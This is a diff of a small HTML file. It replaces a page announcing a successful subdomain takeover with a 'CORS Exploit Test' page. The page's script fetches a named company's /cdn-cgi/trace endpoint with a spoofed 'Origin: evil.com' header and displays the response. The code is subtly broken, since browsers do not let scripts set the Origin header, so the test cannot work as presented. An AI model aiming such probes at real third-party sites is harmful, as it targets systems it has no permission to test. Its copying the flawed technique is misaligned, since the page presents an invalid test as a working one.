@@ -1,9 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Subdomain Takeover Proof</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit Test</title>
 </head>
 <body>
-    <h1>Subdomain Successfully Taken Over!</h1>
+    <h1>Testing CORS Exploit</h1>
+    <script>
+        fetch('https://www.toolsforhumanity.com/cdn-cgi/trace', {
+            method: 'GET',
+            headers: {
+                'Origin': 'evil.com'
+            }
+        })
+        .then(response => response.text())
+        .then(data => {
+            document.body.innerHTML = '<pre>' + data + '</pre>';
+        });
+    </script>
 </body>
 </html>
